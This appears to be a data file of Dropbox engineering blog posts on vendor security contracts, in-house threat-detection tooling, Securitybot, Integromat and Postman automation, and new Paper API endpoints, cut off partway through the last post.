{"website": "Dropbox", "title": "Towards better vendor security assessments", "author": ["Hongyi Hu"], "link": "https://dropbox.tech/security/towards-better-vendor-security-assessments", "abstract": "Addressing vendor security is a significant and inescapable problem for any modern company. Like many other companies, Dropbox has external third-party integrations with our products, and we also use vendors for internal services, from HR workflows to sales, marketing, and IT. In many ways, vendors play a critical part in Dropbox’s overall security posture and thus require appropriate scrutiny from our security team based on the risk posed by the vendor and feasible mitigations. Today, we’re sharing the results of an experiment to improve vendor security assessments—directly codifying reasonable security requirements into our vendor contracts. We’re also sharing our model security legal terms and making them freely available for anyone to use and modify. We hope that more companies adopting this approach will help incentivize vendors to prioritize security and lead to broader security improvements among vendors. Would Dropbox sign these security terms when we are the vendor in question? Of course! We can only demand our vendors commit to a top-tier security posture if we have done the same ourselves. Motivation Like other companies, we have historically used security questionnaires to evaluate vendors as part of our overall vendor risk assessment process. Over time, we realized that questionnaires generally provided little value because they often yielded frustratingly vague answers. Most of the time, it was difficult to verify the answers. In many cases, this resulted in unnecessary back-and-forth discussion, delays for our internal stakeholders that wanted to use the vendor, and ultimately lack of useful signal on vendor security posture. Questionnaires also often favored vendors who could provide answers that sounded good and not necessarily vendors that had a good security program. So we tried to do better. Principles for more useful vendor security requirements No list of security requirements will be perfect. Instead of aiming for perfection, we tried to follow these principles: Encourage transparency. We believe that transparency, such as having a permissive vulnerability disclosure policy (VDP) that encourages security research, is a key characteristic of a good, mature security program. Prioritize decision-making speed. Slowing down our internal stakeholders to make a security decision is a bad result and runs counter to our culture as a security team. We wanted to ensure that the process gave stakeholders a much faster outcome than before and also quickly revealed failure modes that we could rapidly address and iterate upon. Protect ourselves and security researchers. In the modern SaaS world, we must consider vendors to be within our security perimeter. As a security team, we need to be able to test their security posture in order to protect our users’ data. Because anti-hacking laws have become an over-broad and complex patchwork, we need to ensure that we protect ourselves and external security researchers that might be looking for bugs in Dropbox or bugs in our vendors that impact Dropbox. Walk the talk. We should be able to commit to and meet the same security standard that we hold vendors to. We should also keep requirements flexible by capturing the spirit of basic security best practices rather than providing an unnecessarily detailed and rigid list of requirements such as “you must use CVSS to determine severity.” We decided to translate our core security requirements into legal terms that we would automatically add to our standard vendor contract if a vendor posed enough risk. While this might seem like an odd approach, it makes sense for us for several reasons. First, we already needed to impose certain security and privacy contractual obligations on vendors, so we needed to periodically revise existing language to accurately reflect our needs. Second, we needed to secure legal authorization for us and for our bug bounty participants to conduct careful, in-good-faith security testing. That gives us the flexibility to test for bugs ourselves and helps avoid the “snapshot in time” problem of only doing a single initial pen testing assessment. It also allows us to incentivize bug reports from the external security research community and promote more transparency into vendor bug reports. For vendor bug reports that affect the security of Dropbox, we can use our bug bounty program with competitive payouts or top-up the vendor’s bounty payouts. And bug bounty reports provide valuable, concrete data points if we need to argue for cancelling a vendor contract or mitigating risk in other ways if the vendor has demonstrated poor security practices and does not meaningfully improve. Third, putting our security requirements into our contract speeds up the vendor security assessment process by centralizing all of our requirements in one format instead of incurring the overhead of a separate process for addressing security questionnaires. Fourth, we’ve seen vendors try to bluff their way to good answers to a vendor security questionnaire. Is it the sales team or the security team leading the discussions? Sometimes it’s hard to tell. By engaging directly with the vendor’s legal team, we get less bluffing and more direct discussion. Finally, if vendors flat out refuse to agree to certain provisions, that’s a potentially useful signal as to their overall commitment level to security, as well as to what risk areas to dig into further. Of course, this method is not perfect, and we’re still iterating on the language, the scope, and best practices for addressing vendors who sign on but demonstrate unacceptable security practices and do not improve. But we think this is the right direction for our industry to go. We hope that as more companies experiment and adopt this idea that it will become normal and expected for vendors to have more transparency and higher standards around security. Share and Experiment! If you would like to experiment with our model security legal terms, please do so! We are unable to provide legal advice to you, and we highly recommend working with your own legal team to determine how to best employ the model language and modify it to suit your particular needs. Every security program has different challenges and risks, and we hope this is a useful starting recipe. And if you have any feedback or pull requests to share, please let us know. We would love to see a set of standardized legal templates for vendor security that are useful and well-tested in the future. Early results The early results from this experiment are encouraging. We’d like to thank our vendors and partners who have signed our new legal terms. They understand and welcome the benefits of transparency, and who have committed to protecting good-faith security research. We expect their lead to become industry norm over time. Specific benefits of our legal terms so far include: One vendor discovered missing 2FA on an important surface, and contractually committed to fix this. It is likely this was only discovered due to the diligence present in checking legal terms, and that a standard vendor security questionnaire would have glossed over this. These vendors are in scope for our various hackathon events, such as the H1-3120 event we previously blogged about . This event resulted in the discovery (and quick patching) of an RCE-class vulnerability in one of our vendors. Dropbox has a mature bug bounty program with top-tier VIPs. Coming under the umbrella of the Dropbox program, these vendors—even those with existing private bounty programs—have received dozens of high value vulnerability reports including lots of XSS, CSRF, IDOR and SQLi. Some of these were serious and discovering them so they can be patched is in everyone’s best interest. These results are win-win, so we will continue with our new legal terms and encourage other parties to also adopt them. On the flip side, we have refused to do business with vendors who have rejected significant portions of our security legal terms. We see refusal to commit to things like transparency and protecting security researchers as significant red flags that the vendor’s commitment to security falls below our standards. Thanks Special thanks to Becca Friedman, Caroline Bontia, Chris Evans, Dan Cook, Devdatta Akhawe, Mangesh Kulkarni, Rajan Kapoor, Romeo Gonzalez, and everyone else on the legal and security teams at Dropbox for all their help and advice on implementing this experiment. // Tags Security Open Source // Copy link Link copied Link copied", "date": "2019-03-27"},
{"website": "Dropbox", "title": "How Dropbox Security builds tools for threat detection and incident response", "author": ["Mayank Dhiman"], "link": "https://dropbox.tech/security/how-dropbox-security-builds-better-tools-for-threat-detection-and-incident-response", "abstract": "The problem we’re solving Building Alertbox to contextualize alerts Abstracting datasources and encapsulating logic Performing investigations and threat hunting in Covenant Putting Everything Together with Forerunner Conclusion The Dropbox Detection and Response Team (DART) detects and mitigates information security threats to our employees, infrastructure, and customer data. DART ingests security-relevant logs for building detection, threat hunting and responding to potential incidents. Our log volume is huge, averaging tens of terabytes a day. DART’s alerting and response pipeline uses Python and Jupyter notebooks to create new tools. The problem we’re solving Apart from building detections to track suspicious behavior and triaging incidents, we also spend large chunks of our time triaging false positive alerts and building context around individual alerts. This was time not spent hunting for attackers. As a result, any way to automate or improve triage process efficiency was appealing. Our massive log volume also imposed some constraints. One such constraint is that we can’t keep all of our logs in one place. Currently, the volume and source of logs determines which data store they go into. Another factor which comes into play is the type of queries we want to write against that log type. Unfortunately, this imposed a burden on data analysis. For example, during investigations, we would have to search through logs stored across multiple data stores to understand the full picture. The use of different data stores also forced the team to learn multiple query languages with different properties and interfaces. This made on-boarding new team members more difficult. This fragmentation of data also meant that we could not easily contextualize our rules. If a rule triggers on some events, it was cumbersome to then pull context across other data stores. To simplify things, our team wanted a common language and interface to query logs stored in different data stores. Also, we wanted the same set of core tools for various stages of the Incident Response cycle — building detections, contextualizing alerts, threat hunting and actual response. Building Alertbox to contextualize alerts Alertbox was the first project we built to start cutting down on our triage time. The goal was to move our alert response runbooks into code, and have them execute before we even begin the triage process. The first steps in our alert runbooks were often about gaining initial context—information about users, hosts, and processes involved in the alert. To receive this necessary context, DART would often have to query a database or custom internal service. We couldn’t easily implement those queries in our SIEM (Security Information and Event Management), where the majority of alerts fired from, since the data we wanted lived elsewhere. What we needed was a way to run code in response to these alerts, which would allow us to interface with our various datasources and build in custom logic or context. We built Alertbox around the concept of a Workflow, which is a Python class that maps to a particular alert. Python was the obvious choice for Alertbox, as Dropbox is heavily invested in the language and it’s the most popular language in the security and data science communities. In the snippet below, the “Default Workflow” acts as a catch-all for any alerts that did not have their own workflow. Copy class DefaultSIEMEventWorkflow(Workflow[SIEMEvent]):\r\n    def __init__(self, siem_client, jira, forerunner):\r\n        # type: (SIEMClient, JiraAPI, ForeRunnerAPI) -> None\r\n        self.jira = jira\r\n        self.siem_client = siem_client\r\n        self.forerunner = forerunner\r\n\r\n    @classmethod\r\n    def create_instance(cls):\r\n        # type: () -> DefaultSIEMEventWorkflow\r\n        jira = JiraAPI('dart-bot')\r\n        siem_client = create_siem_client()\r\n        forerunner = ForeRunnerAPI()\r\n        return DefaultSIEMEventWorkflow(siem_client, jira, forerunner)\r\n\r\n    def process_event(self, workflow_context):\r\n        # type: (WorkflowContext[SIEMEvent]) -> None\r\n        alert_name = workflow_context.event.name\r\n\r\n        event = workflow_context.event\r\n        url = event.url\r\n\r\n        runbook = extract_runbook_url(event.logs[0])\r\n\r\n        jupyter_notebook_url = self.forerunner.generate_jupyter_notebook_url(\r\n            alert_name=alert_name, alert_content=event.logs[0]\r\n        )\r\n\r\n        tags = extract_tags(event.logs)\r\n        table = Table.convert_to_table('Raw Logs', event.logs)\r\n\r\n        try_create_jira_ticket(self.jira, alert_name, url, jupyter_notebook_url, tags, runbook, table) Alertbox provides the first major building block for improving our response capability, allowing for default context to be added to our tickets. Abstracting datasources and encapsulating logic Alertbox gave us the orchestration and workflow abstraction that allowed us to write custom code in response to alerts. The next step was to start building out libraries for the workflows to leverage, allowing us to pull in context more easily, write workflows more quickly, and avoid thinking about implementation details such as where our data lived. We built out a ‘datasources’ library for this purpose—a Python library with groups of modules that could abstract away the details we didn’t care about. Copy class AuditExecLog(Log):\n    def __init__(\n            self,\n            auid, # type: int\n            node,  # type: str\n            uid, # type: int\n            pid, # type: int\n            ppid, # type: int\n            comm, # type: str\n            euid,  # type: str\n            proctitle,  # type: str\n            timestamp,  # type: int\n            username,  # type: str\n    ):\n        pass\n\n    def get_children(self):\n        # type: () -&gt; List[AuditExecLog]\n        \"\"\"\n            Find execution of processes where the parent process is `self`\n        :return: List of AuditExecLog, representing child processes\n        \"\"\"@cached\ndef get_machine_profile(client, hostname):\n    # type: (MPClient, str) -&gt; Optional[MachineProfileEntry]\n    query = build_mp_query(hostname)\n    response = MachineProfileEntry.query(client, query)\n    return response or None We began creating very low level abstractions that map directly to our underlying data stores. One example of this is the AuditExecLog, which is a Python wrapper for the Linux audit subsystem’s log format. Given a suspicious execution log, we would often want to pull in related executions, such as child processes. Pulling in related executions is actually somewhat complex when working with raw queries such as handling issues like PID collisions. Our datasources library encapsulates all of that complexity into a simple method call, get_children, making an otherwise complex query trivial. We also need to understand the systems involved in our investigations. DART tracks and stores information on every asset in Dropbox’s various environments such as the status of tooling on the system, any associated owners or teams, ip addresses, hostnames, etc. This aggregate information is stored in an entity called Machine Profile. Below is a simple helper function to look up a MachineProfileEntry by just passing in a hostname. This helper encapsulates logic for caching results, building out the raw query, and parsing out the result into a Python object: MachineProfileEntry. Copy @cached\ndef get_machine_profile(client, hostname):\n    # type: (MPClient, str) -&gt; Optional[MachineProfileEntry]\n    query = build_mp_query(hostname)\n    response = MachineProfileEntry.query(client, query)\n    return response or None Performing investigations and threat hunting in Covenant Alertbox and the datasources library allowed us to build automated responses to our alerts, but investigations still required knowing where the data actually lived, the underlying data abstractions, and the multiple query languages. This disconnect between the primitives available for automation and what was required for actual investigations was cumbersome. In order to tackle this, we built Covenant, our investigation tool built on top of Jupyter Notebooks . If you’re unfamiliar with Jupyter Notebooks, think of them as a super powered Python REPL . The building blocks of Jupyter notebooks are cells, which can be populated with Python code or Markdown. You can then modify the Python code that’s written in the cell and re-execute the cells as you choose. Jupyter Notebooks are a very powerful and popular tool with the data science community where they’re used for slicing data, building up models, and sharing reports—work that’s very closely aligned with what we do on DART. Here you can see these cells and how our notebook provides us with helpful autocompletion to navigate our various abstractions. One of the key design decisions behind Covenant was that the fundamental abstractions and tools for working with the data should be common between the automation and the investigation platforms. Covenant achieves this by using Bazel , an open source build system similar to Make ), which works with various programming languages (like Python) and allows us to specify dependencies. Instead of using a vanilla Jupyter environment, Covenant uses a custom Bazel-built kernel with a dependency on the datasources library. This allows us to start interacting with our data and conduct hunting exercises, using the existing primitives used to contextualize/respond to alerts. An example investigation. How do we secure Covenant? Covenant is an incredibly powerful tool: it is effectively a remote Python shell. And Jupyter itself is not immune to vulnerabilities . So we took a lot of steps to secure it: Covenant doesn’t have direct access to the internet and no packages are pulled directly from the internet during the build process Covenant sits behind a proxy where we enforce strong 2FA based authentication and authorization checks to ensure only members of DART have access. For defense in depth, Covenant also uses application level authentication We implement a strong Content Security Policy, and enforce CSRF protection for both GET and POST requests using SameSite cookies (Check out The Call is Coming From Inside the House: Lessons in Securing Internal Apps talk given by our own Hongyi Hu) Putting Everything Together with Forerunner Code and output are intermingled and any analysis is self-documented in Jupyter notebooks. We wanted to leverage this to record any analysis/investigations performed and tie them to individual alerts fired. Think of Forerunner as the glue between Alertbox and Covenant. When an alert fires, Alertbox calls out a RPC service called Forerunner. This service returns a Jupyter notebook corresponding to the alert. Alertbox then embeds the URL of this Jupyter notebook into the alert ticket. In the background, Forerunner also runs this alert notebook asynchronously. The notebooks usually contains heavier queries that pull even more context for that alert. The on-call may then conduct their investigation in the notebook using the same primitives developed in the datasources library. These investigations are automatically recorded. A sample alert investigation using Forerunner. Conclusion Traditionally, the most common method of building threat detection and response tools is to de-couple the automation and investigation pieces. In our experience, this leads to a massive amount of thrash. At Dropbox, we have invested in a common underlying abstraction for our logs which is available during various stages of the Incident Response cycle via Alertbox, Covenant, and Forerunner. Integrating and leveraging powerful open source tools has enabled us to quickly explore our data and automate alerts away so we can focus on more sophisticated threats. If you have a passion for security and exploring threats at scale, our team is hiring . // Tags Security ntrusion Detection Threat Detection Incident Response // Copy link Link copied Link copied", "date": "2019-10-16"},
{"website": "Dropbox", "title": "Security at scale: the Dropbox approach", "author": ["Chris Evans"], "link": "https://dropbox.tech/security/security-at-scale-the-dropbox-approach", "abstract": "The Dropbox Security Team is responsible for securing over 500 petabytes of data belonging to over half a billion registered users across hundreds of thousands of businesses. Securing data at this scale requires a security team that is not only well-resourced, but also one that can keep ahead of the expansion of our platform. We focus on scaling our own leverage, so each new security person we add multiplies the impact of our team. Over the course of this year—and beyond—we’ll go into more detail on how Dropbox approaches security and some of the projects we’ve tackled. Protecting Dropbox requires serious investments in security. We have a large number of security sub-teams and we’ll be hearing from many of them. Some of the themes we’ll look to explore in more detail include: Culture, not training It’s relatively easy to spin up an annual security training and declare your responsibility done. We do have security training, of course, but stopping there would be a mistake. A security team needs an open, ongoing relationship with the rest of the company, not a once-a-year checkpoint. At Dropbox, we’ve caught many attacks and internal problems early because of this partnership with Dropbox employees. By nurturing our culture of security, we’re scaling out our team’s instincts to the wider company. Independent validation The strongest defenses are the ones that are regularly tested and improved on an ongoing basis. I’ve been to dry board meetings in the past where I’ve been asked “do you get an annual pen test?,” as if an affirmative answer were all that’s needed for a robust security posture. We engage annually in not one, but multiple external paid product assessments: pen tests, product security assessments, and formal red team engagements. On top of these external tests, we have a dedicated internal Offensive Security team that performs adversarial testing day in, day out. And we still do more. On top of that, we invite the broader security community to participate via our Bug Bounty Program . The bounties have helped us close many important bugs, and build strong relationships with researchers. We’ve seen a lot of success and we recently increased our rewards to industry-leading levels. We’ve effectively scaled out security testing to the internet at large. Engineering advanced tooling One of the best ways to scale a team is to write code and tools and have computers do the work. We use in-house engineering to counter attempted abuse of our product in many different ways (for example, deflecting password brute forcing attempts). We also use engineering to help with internal security challenges. Last year, we open sourced SecurityBot , a way to automate certain components of internal alerting. For critical applications where commercial tools are lacking, we’re not afraid to engineer open source replacements, such as for Mac OS host monitoring . Closer to the product, we make sure to identify the most critical pieces of code and invest heavily in these places. An example here is the care we take in choosing how to hash and encrypt user passwords at rest. A further example is how we encrypt data in transit: we don’t just check the “SSL” box, we also use a range of industry-leading HTTP, SSL and cryptography best practices . Enabling users to self-serve Helping users to discover features that help them self-secure is a great way to scale. We’re an early supporter of multi-factor authentication and support very strong factors including U2F keys . But launching stronger authentication, ironically, may introduce scaling challenges in account recovery or risk more account lock outs. Our goal is to make strong security easy, so we launched linked mobile devices as a strong self-serve recovery option . And sometimes it’s simple things like making sure the technology behind “standard” features—such as the password strength estimator —is doing a great job at guiding users to good choices that can have a big impact. I’m excited for what the team will deliver in 2018. Follow our progress here. // Tags Security Culture // Copy link Link copied Link copied", "date": "2018-02-13"},
{"website": "Dropbox", "title": "Meet Securitybot: Open Sourcing Automated Security at Scale", "author": ["Alexbertschdbx"], "link": "https://dropbox.tech/security/meet-securitybot-open-sourcing-automated-security-at-scale", "abstract": "Security incidents happen. And when they do, they need to be dealt with— quickly . That’s where detection comes into play. The faster incidents are detected, the faster they can be handed off to the security team and resolved. To make detection as fast as possible, teams are usually aided by monitoring infrastructure that fires off an alert any time something even slightly questionable occurs. These alerts can lead to a deluge of information, making it difficult for engineers to sift through. Even worse, a large number of these alerts are false positives, caused by engineers arbitrarily running sudo -i or nmap . Ignoring some of these alerts is tempting. After all, for every alert that involves a person, a member of the security team needs to manually reach out to them. More alerts means more work: we all know that Chris runs nmap about six times a day, and the SREs need to run sudo fairly often. So we can just ignore those alerts, right? Wrong . This sets a dangerous precedent that never ends well . There’s a clear need for a system that can reduce the burden of alerts for the security team. A year ago, Slack set out to tackle this very issue . Instead of manually reaching out to employees to verify their actions, they built an automated system designed to reach out and send aggregate results back to the security team. We were inspired: what if our team at Dropbox created an automated, distributed alerting bot of our own. Could we reduce the burden of alerts for our security team, and help them sort through alerts faster than ever before? To answer that question, we developed and deployed Securitybot , and found out that yes, we could. But we didn’t want to stop there. As a founding member of the TODO Group (short for Talk Openly, Develop Openly), we are committed to sharing our knowledge with the greater tech community through support of open source projects. So, today we are also open sourcing our implementation in the hopes that other companies can benefit from what we’ve built. Efficient incident detection One of the hardest, most time-consuming parts of security monitoring is manually reaching out to employees to confirm their actions. Despite already spending a significant amount of time on reach-outs, there were still alerts that we didn’t have time to follow up on. We wanted to implement a system that would reach more users while allowing us to spend more time on other things, like building better detection tools and proactively hunting for bad actors. Securitybot now finds its place in our alert detection chain. Soon after an alert is fired, an employee receives a message asking them to confirm whether they performed a potentially malicious action. Their response is then stored and later sent to the security team. Alert rollups are later augmented with employees’ responses to the bot. In the event where an employee reports that they did not perform an action, the security team is alerted immediately. This is meant to keep most alerting in the background but to surface the alerts that truly require prompt attention and follow-up. Rather than spending their time repeatedly reaching out, our security engineers now have more time to work on foundational projects that improve our overall security posture. Design When designing Securitybot, we wanted to hit on all the key points from Slack’s post. And the core ideas are retained: Securitybot is tied into our detection and alerting system and our company-wide Slack instance. Upon getting an alert, the bot contacts whoever triggered the alert and logs the response for the security team. However, we also wanted to extend the design to make it more useful to Dropbox and ideally the community at large. The goal was to make our implementation modular and reusable. For instance, if we shift chat platforms or monitoring systems, we wanted to be able to do so without rewriting the core code. Securitybot was designed around a set of core functions that reach out to monitoring and communication systems via a set of simple, composable plugins. Securitybot moves between grabbing new alerts from our monitoring tools and communicating with employees. Whenever a new alert is encountered, it’s logged and a message is queued for whomever triggered it. Regular polling ensures that we get alerts promptly and can deal with them as soon as possible. Later, when responses are collected, they’re brought back into our monitoring system to be available alongside the rest of our alerts. Securitybot ensures that user interaction is prompt and streamlined. For each alert, we simply ask an employee whether they triggered it and for a brief explanation. These are then aggregated back into our monitoring infra so that when we review hourly or daily aggregations all of the responses are right there for review. Responses are secured via 2FA, so even if an attacker managed to compromise Slack as well, they couldn’t fool the bot. Finally, we’ve added a bit of user friendliness. Rather than bombard employees with messages, we let most alerts “snooze.” If we ping you for using sudo , there’s a good chance you may be using it again in the future. So, we don’t bother you for some period of time, because we can be pretty sure three sudo s in a row, in the same context, are all you. Effectiveness First and foremost, Securitybot helps the security team sort through alerts faster than ever before. False positives are resolved without needing to reach out to employees, and possible incidents are immediately escalated. Securitybot not only helps the security team, but all Dropbox employees. Responding to a polite chat bot is much easier than responding, in full sentences at that, to a member of the security team. It not only saves our security engineers time but also all of our employees. (After all, it’s not just production engineers — with the bot we can alert on anomalous events within employees’ e-mail and Dropbox accounts as well unusual activities on their laptops.) We understand the annoyance of having to respond to a nagging security team, and having an unfeeling bot that doesn’t understand “I’m busy, I’ll get to it later” doesn’t make things much better. So, we devoted some time to workshop the interaction between bot and user to ensure that it would be sufficiently pleasant to deal with. We wanted to make our bot polite and cordial rather than blunt and robotic. It turned out that giving a bit of personality to our interactions moved the bot from “annoying” to “adorable.” Open source Finally, we’re excited to share that we’ve open sourced Securitybot . As far as we’re aware, this will be the only open source project to automatically confirm and aggregate suspicious behavior with employees on a distributed scale. We hope that by putting forward an initial open source implementation, we can help others to improve their internal detection and easily get their distributed security up and running. We also hope the security community will share and improve the code. And while we use Securitybot for internal monitoring, the same system could conceivably be used for external, user-facing detection. Lastly, this can hopefully give other teams a starting point for creating their own systems. // Tags Security Open Source Securitybot Slack // Copy link Link copied Link copied", "date": "2017-02-22"},
{"website": "Dropbox", "title": "Automating contract management with Dropbox and Integromat", "author": ["Tahsin Islam"], "link": "https://dropbox.tech/developers/automating-contract-management-dbx-integromat", "abstract": "What is Integromat? Leveraging Dropbox and Integromat to create an automated contract management system Reflections on Dropbox automation Integromat is a powerful integration platform to connect apps and automate workflows in just a few clicks. Featuring 600+ apps and 6,000+ endpoints, Integromat is redefining work automation so everyone can get back to what matters the most. We asked Jessica Herauf , Head of App Partnerships at Integromat, to write a guest post on our developer blog, and share how to accelerate digital paperwork workflows involving digital signature tools, CRMs, and Dropbox. What is Integromat? Integromat is the app integration platform that allows anyone to create powerful integrations and automate tasks. Integromat users range from independent professionals and small businesses to organizations like Spotify, Facebook, and the United Nations. Users can pick from a selection of 600+ apps to automate both simple and complex tasks using Integromat’s drag and drop visual builder. The platform integrates directly with app APIs, and this of course includes the Dropbox API , for which Integromat currently features 14 endpoints or “modules”. Integromat modules allow you to connect Dropbox to hundreds of different apps and automate tasks like: Uploading and downloading files Sharing and moving files between folders Creating file share links Tasks like these are often part of collaborative processes, involving teams that need to increase productivity and bring down costs. With Integromat, users can create their own Dropbox integrations from scratch, or else rely on available templates to automate tasks like: Saving new Telegram files to Dropbox Uploading new Dropbox files to a Slack channel or conversation Backing up Google Photos to Dropbox Below, we will show you how to use Dropbox and Integromat to automate a task that affects an entire industry. Leveraging Dropbox and Integromat to create an automated contract management system The real estate industry is fertile ground for automation. Regular industry procedures like sales, valuations, and leases demand paperwork, which in turn require time and resources. A good example of this paperwork can be found within contracts. By automating contract management tasks, companies can increase their opportunities and revenues. As you can foresee, Integromat and Dropbox can lay the foundation for a contract management automation solution that scales. You will get the best of contract management software, without having to onboard one. Let’s say you are a real estate agent that just closed a sale and need to create, store, and send a contract to your client (or to an attorney) to get it signed and successfully finish the operation. In other words, a normal contracting process, which can take anywhere from several hours to a few days to be completed when done the traditional way. In turn, it adds costs and risk to what is perhaps the most sensitive stage of a real estate sale. With this in mind, we developed an automated solution that will allow you to: Reduce the duration of the process to a matter of minutes Bring down costs Lower the risk levels attached to late contract arrivals Additionally, we are making this automated contract management solution available as an Integromat template . In order to access and use it, you will need an Integromat account. In case you don’t have one yet, please sign up for free . Contract management workflow template Now, back to our use case. The picture above shows the contract management workflow template. It features the tasks/actions that Integromat will automatically complete for you on a recurring basis. These actions are: Watch records/deals on HubSpot CRM Create a contract from a Google doc template Download the contract to Google Drive Send the contract via Gmail to the corresponding recipient Upload a copy of the contract to Dropbox It all begins with HubSpot CRM for a simple reason: in many cases, the need for a contract starts within a customer relationship management (CRM) platform, which is what several real estate professionals use to manage and close property sales. Taking this into account, we chose HubSpot - one of the most popular CRMs out there - as the first module of our template. In case you don’t use HubSpot, Integromat features 28 other CRMs you can select to replace the first module. This module will trigger the whole automated sequence by performing an elementary task: watching your HubSpot records for deals. Whenever a deal gets marked or labeled as “closed”, Integromat will trigger the subsequent steps in the sequence. Hubspot module configuration The second step demands special attention. Here, Integromat will automatically create a contract from a Google doc template, using the data from the corresponding HubSpot record/deal to fill in the details. Note: the Integromat template page provides a contract template, but feel free to modify it or use your own Google doc template, as this will be the document Integromat will use to generate, send, and store your future contracts. Google Docs module configuration After the contract is created, Integromat will download/store it in a dedicated folder within your Google Drive account. This is the third action. Once this is done, Integromat will do the following: Store a copy of the contract in a dedicated Dropbox folder Send a copy of the contract via Gmail to the recipient you want (including yourself) To do this, Gmail and Dropbox modules are placed to pick up the recipient’s email address from the corresponding HubSpot record. See the details of each module below. “Send an email” Gmail module configuration “Upload a file” Dropbox module configuration And that’s it! After this, please save and run the scenario to see how it works. A trial run with one contract produced the following results. Email message with contract attached Plus, a copy of that same contract, stored in a dedicated Dropbox folder. This solution will automatically create, send, and store contracts in just a couple of minutes, beating the most eager, earnest attorneys and assistants by ridiculous margins. Reflections on Dropbox automation The use case presented above is just an example of how Dropbox automation can improve tedious, time-consuming tasks. It goes without saying that contract automation is just the tip of the iceberg of what you can achieve with Dropbox and Integromat. Other workflows that can be automated include: Creating and storing invoices from Shopify orders Sending Gmail attachments to Dropbox folders Uploading podcast audio to Dropbox If your work involves sending and sharing files to and from Dropbox, chances are you can transform it with Integromat. To conclude, none of this would be possible without the kind of APIs companies like Dropbox, HubSpot and Google offer. Integromat features multiple Dropbox endpoints , which anyone can use to automate tasks without the hassle of code, or costly development teams. The potential of combining apps to automate workflows is huge, and not doing so is missing on immediate gains. We hope you enjoyed this guest blog contribution from Jessica Herauf at Integromat, and that it gave you some ideas of how you can build powerful Dropbox integrations. To learn more about Integromat and see more Dropbox modules and templates, head to integromat.com . You can also contact Jessica Herauf directly at jessica.herauf@integromat.com. If you have any questions about this or need help with anything else, you can always contact us here . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Workflow Automation Partners Developer Spotlight // Copy link Link copied Link copied", "date": "2021-03-17"},
{"website": "Dropbox", "title": "New Paper Endpoints Released in Preview", "author": ["Jess Kenney"], "link": "https://dropbox.tech/developers/new-paper-endpoints-released-in-preview", "abstract": "New and Updated APIs Creating a Paper Doc Updating a Paper Doc Building with Paper In September 2019, we began to represent Dropbox Paper files as .paper documents in the filesystem . This enabled listing, moving, and exporting paper docs with /files endpoints. Today, we’ve added new endpoints for Paper—now you can create, update, and even append to paper documents in the filesystem! Paper docs can be added using Markdown, HTML, or plain text. New and Updated APIs The following APIs have been added or modified: /files/paper/create - Use this new endpoint to create new Paper docs /files/paper/update - Use this new endpoint to overwrite or append Paper docs /files/export - Use this endpoint to get metadata and a Markdown, HTML, or plain text representation of a Paper doc. This endpoint has been updated to support new Paper export formats and metadata. Creating a Paper Doc Creating a paper doc is easy—conventions are similar to uploading binary files . Simply specify your target path and input format with the Dropbox-API-Arg header with your text, Markdown, or HTML as the body. Copy curl -v -X POST https://api.dropboxapi.com/2/files/paper/create     \r\n--header \"Authorization: Bearer YOUR_BEARER_TOKEN\"     \r\n--header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/Meeting Notes.paper\\\",\\\"import_format\\\": \\\"plain_text\\\"}\"     \r\n--header \"Content-Type: application/octet-stream\"      \r\n--data-binary @meeting_notes.txt The /files/paper /create call will return the URL, which is presentable to end users to visit and begin editing (Note: permissions on the link can be managed through sharing APIs). The call will also return the result_path and file_id , which can be used with other file operators (like /files/ move and /files/ delete ). Note that if a file already exists at your target destination, create will append a number to the end of the path to prevent a collision. Copy {\r\n    \"url\": \"https://www.dropbox.com/cloud_docs/view/k93hadJEO3-sRkejKYJi4?fileid_gid=0uVLNNU2EdAAAAAAAABTcw\",\r\n    \"result_path\": \"/Meeting Notes (1).paper\",\r\n    \"file_id\": \"id:0uVLZNU2SdAAAAAAAAATcw\",\r\n    \"paper_revision\": 2\r\n} Updating a Paper Doc Updating a paper document with /files/paper/update is similar. Pass the path, input format, and binary content. Update also enables you to specify the doc_update_policy . The append and prepend modes allow you to add content to an existing doc. The overwrite mode will overwrite the entire document, and the update mode overwrites after checking that there are no updates the caller has missed. Dropbox Paper enables live, real-time co-editing. The paper_revision increments for every change to the document. The paper_revision can be passed when using the update mode, which will then error if paper_revision has changed by the time the call reaches Dropbox servers. This provides a mechanism to make sure your programmatic updates do not conflict with any edits made by users.  Other update modes to not require the paper_revision . Note that paper_revision and file revision are different, but related: paper_revision tracks rapid, live updates — which Paper will then batch together to make a file revision .  Use /files/export to retrieve the latest paper_revision . Building with Paper These new APIs are in preview, available to all developers. Note that at the time of writing, not all users have access to paper docs in the filesystem—you may need to issue an API call to /users/features/get_values to check for availability on a per-user basis. See our Paper Migration Guide for more information. As always, we’re available to help! You can post your questions on our developer forum or submit a ticket for more direct support. Build with Dropbox today at www.dropbox.com/developers . // Tags Developers Announcements Preview Paper // Copy link Link copied Link copied", "date": "2021-03-03"},
{"website": "Dropbox", "title": "Dropbox Postman Collection for Team Admin Workflows", "author": ["Marcel Ribas"], "link": "https://dropbox.tech/developers/dropbox-postman-collection-for-team-admin-workflows", "abstract": "Dropbox has more than 500,000 teams using Dropbox Business collaboration capabilities. The rich Dropbox API allows business customers to manage their content and their team programmatically. Although Dropbox Business has a web-based management console , some Dropbox team administration tasks, such as onboarding/off-boarding users, are carried out more efficiently through the API. For example, when you need to remove a number of members from the team, running a script is much faster than manually removing each one. Certain administrative tasks are carried out by combining multiple API requests, executing them sequentially or in conditional loops. We were looking for a way to show how to implement these workflows with the Dropbox API in a format that they could be easily executable, but also extendable, so they can be improved as business needs change. Enter Postman , an API Lifecycle Platform that has more than 10 million registered users. It is a smart way of learning a new API. It has many capabilities, among them the ability to create collections of requests, run scripts before and after issuing requests and executing multiple requests in sequence. It also has an API Network , where companies can publish their collections of endpoints and expose their public APIs to a large population of developers and administrators. Combining the ability to sequence requests and publish collections, Postman seemed like a great platform to build and distribute administrative workflows our customers have been requesting. We built the first version of the Dropbox Team Admin Workflows collection during this year's Hack Week , our company-wide annual hacking event. Our team of technical architects, experienced in supporting large Dropbox deployments, had already been using Postman to help customers. We used that customer feedback to define the workflows in the collection. These are some of the workflows you'll find: Bulk Provision Users and Add to Groups Bulk Deprovision Members with Transfer Destination Bulk Deprovision Members without Transfer Destination Bulk Suspend Members Bulk Unsuspend Members Bulk Add Users To Groups Bulk Update Email Addresses Bulk Add Groups Wipe External ID Bulk Update External IDs Let's have a look at the collection. The picture below is the Dropbox page in the Postman API Network : The Dropbox page in the Postman API Network To add the collection from Postman, go to the Dropbox Team Admin Workflows and click the “Run In Postman” button: The Dropbox Team Admin 